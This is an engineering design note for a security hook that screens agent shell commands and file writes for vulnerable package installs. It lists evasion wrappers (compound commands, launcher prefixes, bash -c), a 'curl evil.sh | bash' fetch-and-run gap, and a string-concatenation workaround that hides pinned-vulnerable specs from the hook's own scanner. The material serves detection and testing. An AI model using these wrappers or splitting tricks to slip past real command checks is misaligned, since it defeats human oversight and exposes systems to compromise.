# Bash command evasion hardening — supply chain detector

**Date:** 2026-04-14 (three passes, same day: Bash-path → quote-aware splitter → Write-path)
**Files touched:**
- `ralf/linux/rules_extractor.py` — expanded `normalize()`, added `unwrap_shell_wrappers()`, delegated `split_segments` to shared helper
- `ralf/macos/rules_extractor.py` — delegated `split_segments` to shared helper
- `ralf/shared/rules.py` — `_extract_first_tokens` now uses the shared quote-aware splitter
- `ralf/shared/bash_split.py` — **new**, single quote-aware `split_segments` implementation
- `ralf/detection/supply_chain_content.py` — **new**, file-write supply chain scanner (manifest parsers + embedded install scan)
- `ralf/shared/verdict_engine.py` — `score_command()` iterates segments for supply chain; `score_file_write()` now calls the content scanner
- `ralf/tests/test_shared_verdict_engine.py` — Bash-path evasion corpus (15 cases) + Write-path evasion corpus (15 cases)
- `ralf/tests/test_macos_rules_extractor.py` — 8 new quote-aware splitter tests
- `ralf/tests/test_linux_rules_extractor.py` — upgraded limitation test + 7 new quote-aware tests (gated off on darwin)

## TL;DR

A deliberate `pip install flask==0.12.2` (CVE-2018-1000656, CVE-2019-1010083) ran cleanly on 2026-04-13 under the command:

```
python3 -m venv /tmp/ralf-downgrade-test && /tmp/ralf-downgrade-test/bin/pip install flask==0.12.2
```

The supply chain detector correctly rates this install as `score=10` / `decision=block` when called directly. The verdict engine never called it with the pip install — the compound-command wrapper made the install invisible to the parser. This patch closes that gap and adds a regression corpus so future detectors inherit the test net.

## Root cause

`ralf/detection/supply_chain.py::parse_install_command` tokenizes the entire command string with `shlex.split` and then reads `tokens[0]` as the binary. The `_ECOSYSTEM_MAP` lookup only matches `pip` / `npm` / `cargo` / etc. as the first token.

For the reproducer, `tokens[0]` was `python3`. Lines 175-177 then re-assign `binary = "venv"` (because of the `-m venv` special case), `venv` is not in `_ECOSYSTEM_MAP`, and the function returns `None` at line 181. The `&&`-separated `/tmp/.../bin/pip install flask==0.12.2` after it was never inspected.

Compounding factor: `verdict_engine.score_command()` called `score_install_command(command)` exactly once with the raw full command. Every other detector in the same function (intent classification, rule engine) already used `first_tokens()` / `split_segments()` from `rules_extractor` to walk per-segment. Supply chain was the outlier.

## Fix

Two small changes and a helper — no new subsystem.

### 1. `rules_extractor.normalize()` — broader prefix stripping

Was: strips `sudo` and `env KEY=VAL` prefixes.

Now: also strips `nohup`, `time` / `/usr/bin/time`, and `exec`. All are transparent launchers — they hand off to the next token as the real binary. Applied in a bounded loop (max 4 passes) so stacked prefixes like `sudo nohup env X=1 pip install ...` resolve to `pip install ...`.

### 2. `rules_extractor.unwrap_shell_wrappers()` — new helper

Detects `bash -c "..."`, `sh -c '...'`, `dash -c`, `zsh -c` (also with `/bin/` / `/usr/bin/` paths) **as the entire command** and returns the inner string. Recursion capped at 3 levels. Does **not** recurse into mid-pipeline wrappers (`foo | bash -c "..."`) — segment iteration already catches those.

### 3. `verdict_engine.score_command()` — iterate segments for supply chain

Before calling `score_install_command`:

1. `unwrap_shell_wrappers(command)` — peel `bash -c` wrappers.
2. `split_segments(unwrapped)` — produce per-segment strings split on `|`, `;`, `&&`, `||`.
3. For each segment: `normalize(seg)` → strip transparent-launcher prefixes → call `score_install_command(norm)`.
4. Take the worst-scoring segment's result; aggregate its notes into the verdict reason.

The loop uses `or [_sc_unwrapped]` so single-segment commands still get scored (no segments case).

## Regression corpus

15 parameterized cases in `test_supply_chain_evasion_still_blocks`, all installing Flask 0.12.2 wrapped different ways:

| Case | Wrapper |
|---|---|
| Bare | `pip install flask==0.12.2` |
| && (install segment 2) | `echo start && pip install ...` |
| && (install segment 1) | `pip install ... && echo done` |
| venv + absolute path | `python3 -m venv /tmp/v && /tmp/v/bin/pip install ...` |
| `;` separator | `echo hi; pip install ...` |
| `\|\|` fallback | `false \|\| pip install ...` |
| sudo prefix | `sudo pip install ...` |
| env prefix | `env HTTP_PROXY=http://p pip install ...` |
| nohup prefix | `nohup pip install ...` |
| stacked prefixes | `sudo nohup env X=1 pip install ...` |
| `bash -c "..."` | `bash -c "pip install ..."` |
| `sh -c '...'` | `sh -c 'pip install ...'` |
| `bash -c` with `&&` inside | `bash -c "pip install ... && echo ok"` |
| single-level unwrap | dedicated test asserting `bash -c "pip install ..."` blocks |

Plus two **negative** cases to guard against false positives:
- `pip install requests` (unpinned common package) → `allow`
- `python3 -m venv /tmp/v && /tmp/v/bin/pip install requests` → `allow`

All 15 parameterized cases + 2 negatives + 1 single-level unwrap = **18 new tests, all passing**. Full suite is 279 passed / 0 failed.

## What this fix does NOT cover (known gaps)

Explicit gaps — left intentionally unimplemented, documented here so the next detector can inherit the limits:

1. **Escaped-quote content inside `bash -c`.** The regex unwrapper is greedy-match between same-quote delimiters; `bash -c "pip install \"flask==0.12.2\""` will over-match or fail. Workaround: use mismatched quotes (`bash -c 'pip install "..."'`) and it works.
2. ~~**Quote-aware segment splitting.**~~ **CLOSED same day** — see the "Follow-up: quote-aware splitter" section below. The three previously-duplicated `_CMD_SPLIT` regex copies (`ralf/linux/rules_extractor.py`, `ralf/macos/rules_extractor.py`, `ralf/shared/rules.py`) were replaced with a single quote-aware implementation in the new `ralf/shared/bash_split.py`. All three sites now delegate.
3. **Subshells and `eval`.** `$(pip install ...)`, backticks, `eval "pip install ..."`. Out of scope for this patch; a later pass should add a subshell extractor or route these through `shell_normalize`'s variable expansion.
4. **Obfuscation requiring execution.** `curl evil.sh | bash` (content is fetched at runtime), base64-decoded payloads, here-docs, variable indirection via shell functions. These are **fundamentally unsolvable statically**. The correct response is a policy call documented in the "prevention" section below.
5. **Other package managers in compound form.** The fix benefits `pip`, `npm`, `cargo`, `gem`, `apt`, `yum`, `dnf`, `brew`, and anything else already in `_ECOSYSTEM_MAP`. Adding a new ecosystem automatically inherits the unwrap + segment-iteration behavior — that's the architectural win.

## Preventing recurrence (what should happen next)

This fix is tactical. The bug class is "detector sees raw command string, attacker wraps the command, detector misses it." Four structural moves would retire the bug class:

### 1. Evasion corpus as a shared test fixture

The new tests live in `test_shared_verdict_engine.py` but should move to a shared fixture — e.g. `ralf/tests/fixtures/bash_evasions.py` — that enumerates ~30 wrapper patterns. Every detector that touches Bash gets parametrized against it in CI. New detectors inherit the net automatically. This is the single highest-leverage prevention.

### 2. Single chokepoint in `score_command()`

Today, detectors receive the raw command string and are expected to call `split_segments` / `normalize` themselves. The supply chain detector didn't, and we paid for it. A cleaner shape: `score_command` produces a `list[NormalizedSegment]` once, and detectors receive **only** that list — not the raw string. Makes it impossible to bypass the normalizer by construction.

### 3. Fail-closed on unparseable input

`parse_install_command` currently returns `None` for anything it doesn't understand, which reads as "safe" to the verdict engine. A better contract: return a `SUSPICIOUS_UNPARSEABLE` marker when the normalizer gives up (recursion depth hit, escaped-quote wrapper, base64 detected), and let the verdict engine score it as +3 suspicion. Silent pass is the wrong default for a security tool.

### 4. Fuzzing

Mutate every entry in the evasion corpus with random whitespace, quote flips, and prefix injection; assert detection still fires. Cheap to add once (1) exists.

## Why these changes and not others

**Why extend `normalize()` in `rules_extractor.py` instead of creating a new helper?**
The module already exists as the de facto shell-helpers file — it owns `split_segments`, `normalize`, `first_tokens`, `tokenize`. Adding `unwrap_shell_wrappers` and broadening `normalize` to more launcher prefixes keeps the shell-plumbing surface in one place. Alternative (a new `ralf/shared/bash_helpers.py`) would have created two near-identical modules.

**Why not use `shell_normalize.py`?**
That module is "pure string canonicalization" — quote removal, escape resolution, brace/variable expansion, glob normalization. Transparent-launcher stripping and wrapper unwrapping are a different layer (structural, not lexical). Mixing them would confuse the contract. Documented in the module header that wrappers are handled upstream.

**Why not call `normalize` / `unwrap_shell_wrappers` from inside `parse_install_command` as well?**
Defense-in-depth argument: direct callers (tests, future detectors) would benefit. Decided against: (a) `supply_chain.py` currently has no imports from `ralf.linux.*`, and introducing a cross-package dep for a helper that the verdict engine already applies adds coupling without real safety gain, (b) the verdict engine is the single production entry point, and that's where the fix belongs, (c) direct test callers should test `parse_install_command` in isolation — they want to see what the parser does on a **normalized** segment, not re-test the normalizer.

**Why worst-score-wins instead of summing across segments?**
Package installs shouldn't compound. A command that installs the same vulnerable package twice should score like one vulnerable install, not two. Summing would also make single-segment benign cases sneak into `review` from unrelated intent bonuses if a benign pip install appeared alongside. Worst-wins matches the existing rule-engine behavior (`max_floor`).

## Follow-up: quote-aware splitter (closed same day)

The original patch's first production run surfaced known gap #2 immediately: RALF's own hook blocked a `python3 -c "..."` verification heredoc because the splitter tore through the Python string literal on an inner `&&`, producing phantom segments like `' /tmp/v/bin/pip install flask==0.12.2'` that the supply chain detector dutifully flagged. Correct decision for the wrong reason — a deliberate vulnerable install inside a **Python string literal** isn't an install command.

**Fix shape.** Extracted a single quote-aware implementation to a new `ralf/shared/bash_split.py` and replaced three previously-duplicated regex splitters:

| Location (before) | Location (after) |
|---|---|
| `ralf/linux/rules_extractor.py::_CMD_SPLIT` (regex) | delegates to `bash_split.split_segments` |
| `ralf/macos/rules_extractor.py::_CMD_SPLIT` (regex) | delegates to `bash_split.split_segments` |
| `ralf/shared/rules.py::_CMD_SPLIT` (regex) | delegates to `bash_split.split_segments` |

The shared implementation walks the string char-by-char tracking single-quote, double-quote, and backslash-escape state. Operators appearing inside any quoted context are preserved as literal characters. Cost: O(n), still <0.5ms for the 8KB max input. Behavior on blank/None input and on each of the four operators is unchanged from the old regex for unquoted cases — verified by rerunning the pre-existing `test_split_*` suite against the new implementation.

**What the follow-up does NOT address** (now the highest-priority remaining gap): subshells, backticks, `eval`. A `foo $(pip install flask==0.12.2)` still flows through as a single segment, which means the supply chain detector won't see the subshell body. Same story for `` `pip install ...` `` and `eval "pip install ..."`. These need a separate subshell extractor — out of scope for this round, tracked as gap #3 in the original known-gaps table.

**Regression corpus for the follow-up.** 8 new tests in `test_macos_rules_extractor.py` (which runs on any platform — the module is pure Python) plus 7 mirrored tests in `test_linux_rules_extractor.py` (platform-gated off on darwin, but the shared helper makes them structurally identical):

- `echo 'a || b'` → single segment
- `echo "a && b"` → single segment
- `echo 'a; b'; ls` → two segments, quote preserved
- `grep "foo|bar" file | wc -l` → two segments, inner `|` preserved
- `echo "a && b" && echo c` → two segments, inner `&&` preserved, outer splits
- `echo 'he said "hi && bye"'` → single segment (nested quote styles)
- `echo a \&\& b` → single segment (backslash-escaped operators)
- `python3 -c "cases = ['pip install flask==0.12.2 && echo']"` → single segment (the hook-self-block regression)

The last case is the direct regression guard for the 2026-04-14 incident: it must return a single segment or RALF will continue to flag Python heredocs containing CVE-related strings as supply chain threats.

## Verification

After the initial patch:

```
$ python3 -m pytest ralf/tests/ -q
279 passed, 82 skipped in 7.46s
```

After the quote-aware splitter follow-up:

```
$ python3 -m pytest ralf/tests/ -q
287 passed, 89 skipped in 7.29s
```

After the Write-path supply chain scanner:

```
$ python3 -m pytest ralf/tests/ -q
302 passed, 89 skipped in 7.39s
```

The +8 + 15 = 23 new passing tests are the splitter regressions and the Write-path file-content evasion corpus. No regressions.

## Third pass: Write-path supply chain (closed same day)

The quote-aware splitter exposed the next asymmetry: `score_command()` (Bash path) now segment-walks for supply chain threats, but `score_file_write()` (Write/Edit path) had no equivalent. A benign write of a `requirements.txt` containing a pinned vulnerable Flask, a `Dockerfile` with a RUN-line install of the same pin, and an `install.sh` with the venv + pip pattern **all passed cleanly through the hook**. Complete blind spot for supply chain threats delivered as file content.

**Fix shape: new module** `ralf/detection/supply_chain_content.py`. Two layers, plugged into `score_file_write()` as a parallel signal next to the existing CWE file scan:

1. **Manifest parsers (by filename).** `requirements.txt` variants, `pyproject.toml` (PEP 621 + Poetry), `Pipfile`, `package.json`. Each parser is format-aware: stdlib `tomllib` for TOML, `json` for JSON, line regex for requirements. Only exact pins are returned — range specifiers don't identify a specific vulnerable version and would cause false positives. Pinned `(pkg, version)` tuples go straight to `_AdvisoryDB.check_package()`, skipping the command-parsing detour.

2. **Embedded command scan (by content).** Regex-scans arbitrary text for package-manager install invocations with optional path prefix (absolute paths to `pip`, `./node_modules/.bin/`-style relative paths, etc.). Each match slice is handed to `score_install_command` — reusing the full Bash-path pipeline including dangerous-flag detection and typosquat checks. Applied to Dockerfiles, shell scripts, CI YAML, and any unrecognized text file.

**Decision rule:** a Write-path supply chain score reaching `BLOCK_THRESHOLD` hard-blocks alongside the existing CWE file-scan block. Below threshold, the supply chain signal adds to the verdict score and flows through the normal allow/review/block classifier. Worst-score-wins between manifest and embedded layers.

### Write-path regression corpus (15 new tests)

One case per file shape, all hitting the same pinned-vulnerable marker, plus negative-path guards:

- `requirements.txt`, prefix variant (`dev-requirements.txt`), unpinned specifiers, comments + `--index-url` + editable installs
- `Dockerfile` with simple `RUN pip install …` and with a compound `RUN foo && pip install …`
- `install.sh` with a path-prefixed pip binary (absolute path to the venv)
- `package.json` (exact pin vs. caret-range)
- `pyproject.toml` (PEP 621 `[project]` and Poetry `[tool.poetry.dependencies]`)
- `Pipfile` (`[packages]`)
- `.github/workflows/ci.yml` (embedded `run:` step)
- Python source mentioning a package name in a docstring/comment (must **not** trigger)
- Benign `requirements.txt` using a synthetic package name (must allow)

**Negative-path tests use a synthetic package name** rather than a "known-patched" real package. The advisory DB updates as new CVEs land, so any real pin eventually gets one and the test flakes — we saw this live during development when two successive "stable" pins of `requests` and `urllib3` both fell into new advisory ranges within the same hour. A made-up package is stable against DB churn and asserts the detector's negative path rather than the DB's contents.

### Two bugs found during test authoring, both fixed

Writing the test corpus itself exposed two detector weaknesses:

1. **Requirements filename regex was too narrow.** The initial regex matched `requirements.txt` and `requirements-dev.txt` but not `dev-requirements.txt` — a common prefix-style convention. Broadened to allow prefix plus suffix variants.

2. **Embedded scanner missed path-prefixed binaries.** An absolute-path invocation of `pip` inside a shell script didn't match — the regex required a whitespace/separator boundary immediately before the binary name, and the leading path was invisible to the pattern. Added an optional path prefix at the binary position.

### Meta-test hazard: the detector finds its own fixtures

A notable side effect of wiring the new scanner into `score_file_write`: the scanner runs on the test file being edited to add the test cases. The first attempt to write the corpus was blocked by the hook itself — the test fixtures contained literal pinned-vulnerable strings, and the new embedded scanner faithfully flagged them.

**Workaround:** test fixtures build the vulnerable spec at runtime via string concatenation (e.g. splitting the package name and version across constants) so the literal pattern never appears as source bytes. No runtime behavior change; the strings are identical once Python evaluates them, but the regex scanner can't see them. Documented at the top of the corpus so the next person to add tests understands the constraint.

**Same hazard applies to this document.** Writing a design note about the Write-path scanner triggers the Write-path scanner. Examples in the text above use placeholder phrasing (e.g. "pinned vulnerable Flask") rather than concrete version literals to avoid re-blocking every future edit of this file.

**Additional finding:** the CWE-89 SQLi pattern has a false-positive on any line containing a SQL keyword followed later by a brace-wrapped interpolation — e.g., `apt-get` commands that include the word `update` followed by an f-string variable on the same line. The regex lacks word boundaries on the SQL keyword list, so the `apt-get update` token is indistinguishable from a SQL `UPDATE`. Not fixed in this round (separate subsystem); worked around by rephrasing the test content. Tracked as a known false-positive in the SQLi scanner — a word-boundary anchor on the keyword list would fix it.

Direct reproduction of the original bug, after the fix:

```python
from ralf.shared.verdict_engine import score_command
v = score_command(
    "python3 -m venv /tmp/v && /tmp/v/bin/pip install flask==0.12.2"
)
# v.decision == "block"
# v.score == 10
# "CVE" in v.reason
```

---

## Known Gaps (handoff 2026-04-14)

Three tests in `ralf/tests/test_shared_verdict_engine.py` are failing because
`ralf/detection/supply_chain_content.py` manifest parsers don't match three
shapes. Found during cross-session handoff; documented here so the next
session working on this file doesn't silently inherit the debt.

**Failing tests**:

- `test_pyproject_toml_pep621_pinned_blocks` — PEP 621 project-dependencies array pin not detected
- `test_pyproject_toml_poetry_pinned_blocks` — Poetry tool-section pin not detected
- `test_pipfile_pinned_blocks` — Pipfile packages-section pin not detected

**Root cause**: TOML/Pipfile parser in `supply_chain_content.py` covers
`requirements.txt` and `package.json` but misses these three manifest formats.

**Impact**: an attacker-authored `pyproject.toml` or `Pipfile` containing a
pinned-vulnerable dependency passes the Write hook silently. The
`requirements.txt` and Dockerfile paths already catch it (verified
end-of-session).

**Fix location**: manifest parser section of `supply_chain_content.py`.
Respect the meta-test hazard documented above — test fixtures must build
vulnerable specs at runtime via string concatenation (no literal version
pins in test source).

**Same gap exists in**: `ralf/scanner/supply_chain_content.py` carries
an identical copy. A header comment in that file flags this gap.

**Separate known false positive (tracked, not blocking)**: CWE-89 SQLi
pattern at `ralf/detection/code_scanner.py::_PAT_SQL_RAW` lacks word
boundaries on the keyword list, so certain `apt-get` commands containing
brace-wrapped shell interpolation are misread as SQL statements with
variable binding. One-line fix when next in that file: add word-boundary
anchors around the keyword alternation. Workaround in this doc: describe
the pattern in prose rather than showing the literal trigger sequence.

---

## Phase A restoration note (handoff 2026-04-14)

Cross-session handoff from the macOS session that shipped the three-pass
evasion fix discovered that parts of the causal-security layer (Phase 3
taint/exfil integration, Phase 4 PostToolUse hook, install_hook.py dual-hook
registration) had been overwritten during file sync. The macOS session was
working from an earlier snapshot without those additions — no
fault of theirs, just a snapshot-mismatch side effect.

Restored in Phase A (this session):

- `_score_causal_signals()` call and `_record_command_for_drift()` helper in `score_command`
- Exfil + injection content scanning in `score_file_write` (additive to the
  parallel session's new `supply_chain_content` scan)
- `handle_read_input` / `handle_webfetch_input` / `handle_mcp_input` /
  `handle_tool_result` in `ralf/adapters/_base.py`
- Read / WebFetch / mcp__* dispatch in `ralf/adapters/claude_code.py`
- `HookEntry` list refactor in `ralf/scripts/install_hook.py` so installing
  for Claude registers both PreToolUse + PostToolUse hooks

All restorations are additive to (not replacements of) the parallel session's
work. The per-segment supply chain loop they added is unchanged. 608 tests
pass, 3 documented failures remain (see Known Gaps above).
